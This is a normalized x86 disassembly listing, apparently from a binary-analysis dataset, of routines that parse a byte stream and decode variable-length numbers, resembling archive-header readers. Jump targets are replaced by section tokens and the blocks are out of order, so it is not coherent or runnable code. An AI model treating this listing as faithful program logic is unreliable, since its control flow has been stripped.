mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ ebp - 0xc ]
cmp edx [ eax + ecx + 0x24 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
cmp [ eax + ecx + 0x24 ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
jmp r-xdata
sub_404120
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x28 ]
add esi [ edx + eax * 8 ]
mov ecx [ ecx + 0x2c ]
adc ecx [ edx + eax * 8 + 0x4 ]
mov eax esi
mov edx ecx
pop esi
pop ebp
retn
sub_404150
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x6
jae r-xdata
mov eax 0x1
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + rw-data ]
cmp edx ecx
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_4041a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov cl [ edx ]
mov [ eax ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
mov eax 0x10
jmp r-xdata
pop ebp
retn
sub_4041e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4041a0
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_404230
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x4
jge r-xdata
xor eax eax
lea edx [ ebp - 0x5 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4041a0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
mov ecx [ ebp - 0xc ]
shl ecx 0x3
shl edx cl
mov eax [ ebp + 0xc ]
or edx [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4042b0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x7 ] 0x80
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4041a0
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ edx + 0x4 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
xor eax eax
movzx ecx [ ebp - 0x5 ]
movzx edx [ ebp - 0x7 ]
and ecx edx
jne r-xdata
lea edx [ ebp - 0x6 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4041a0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
movzx ecx [ ebp - 0x7 ]
sub ecx 0x1
and eax ecx
cdq
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0xc ]
shl ecx 0x3
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
call sub_43af80
mov ecx [ ebp + 0xc ]
add eax [ ecx ]
adc edx [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
xor eax eax
jmp r-xdata
movzx eax [ ebp - 0x6 ]
cdq
mov ecx [ ebp - 0xc ]
shl ecx 0x3
call sub_43af80
mov ecx [ ebp + 0xc ]
or eax [ ecx ]
or edx [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov dl [ ebp - 0x7 ]
shr dl 0x1
mov [ ebp - 0x7 ] dl
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_4043c0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0xc ] 0x80000000
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0xc ] 0x4000000
jb r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
xor eax eax
sub_404460
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
xor edx edx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
sub eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
xor eax eax
ja r-xdata
mov eax 0x10
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
mov esp ebp
pop ebp
retn
sub_4044b0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404460
add esp 0xc
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_404500
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
or edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4044b0
add esp 0x4
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
sub_404560
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4044b0
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
sub_4045e0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x6 ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
xor eax eax
movzx eax [ ebp - 0x6 ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x5 ]
movzx ecx [ ebp - 0x6 ]
and eax ecx
je r-xdata
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4041a0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov [ ebp - 0x6 ] 0x80
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp - 0x14 ]
mov [ eax + ecx ] dl
mov al [ ebp - 0x6 ]
shr al 0x1
mov [ ebp - 0x6 ] al
jmp r-xdata
sub_4046c0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4041a0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4045e0
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov [ eax + ecx ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_404790
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4046c0
add esp 0x10
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
shl edx 0x2
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x18 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
movzx edx [ eax + ecx ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ecx + edx * 4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404230
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
jmp r-xdata
sub_404860
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
push 0x0
push 0x9
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404560
add esp 0xc
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
shl edx 0x3
push edx
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx ]
jae r-xdata
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_404440
add esp 0x8
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp - 0x10 ]
lea eax [ ecx + edx * 8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4044b0
add esp 0x4
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404790
add esp 0x14
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
shl ecx 0x2
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx ]
jae r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + eax ] 0x0
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + eax * 4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_404ac0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4041a0
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
sub_404b20
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4043c0
add esp 0x8
mov [ ebp - 0x9c ] eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x20
jbe r-xdata
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
mov [ edx + 0x10 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
imul edx edx 0x18
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x88 ]
mov [ eax ] ecx
cmp [ ebp - 0x88 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x34 ]
imul ecx ecx 0x18
mov edx [ ebp + 0xc ]
add ecx [ edx ]
push ecx
call sub_403900
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
imul edx edx 0x18
mov eax [ ebp + 0xc ]
add edx [ eax ]
mov [ ebp - 0x38 ] edx
lea ecx [ ebp - 0x15 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4041a0
add esp 0x8
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx 0x1
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ edx + 0x14 ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
movzx eax [ ebp - 0x15 ]
and eax 0xf
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4041e0
add esp 0xc
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov eax [ ebp - 0x90 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
shl edx 0x3
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x58 ]
mov [ eax + 0x4 ] ecx
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x3c ]
jae r-xdata
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x50 ]
jae r-xdata
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x3c ]
jae r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x34 ]
lea ecx [ edx + eax * 8 ]
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x68 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
je r-xdata
movzx edx [ ebp - 0x15 ]
and edx 0x10
je r-xdata
mov ecx [ ebp - 0x50 ]
sub ecx 0x1
sub ecx [ ebp - 0x44 ]
movzx eax [ ebp + ecx - 0x14 ]
cdq
mov ecx [ ebp - 0x44 ]
shl ecx 0x3
call sub_43af80
mov ecx [ ebp - 0x38 ]
or eax [ ecx + 0x8 ]
or edx [ ecx + 0xc ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x40 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x48 ]
mov [ edx + 0x18 ] eax
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0x68 ]
add ecx 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4043c0
add esp 0x8
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x1
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x4 ] 0x1
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4043c0
add esp 0x8
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
mov edx [ ebp - 0x44 ]
add edx 0x1
mov [ ebp - 0x44 ] edx
mov edx [ ebp - 0x48 ]
shl edx 0x2
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x78 ]
mov [ eax + 0x8 ] ecx
cmp [ ebp - 0x78 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
movzx eax [ ebp - 0x15 ]
and eax 0x80
je r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x30 ] xmm0
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4042b0
add esp 0x8
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov edx [ ebp - 0x38 ]
add edx 0x4
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4043c0
add esp 0x8
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0xa0 ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x40 ]
add ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4c ]
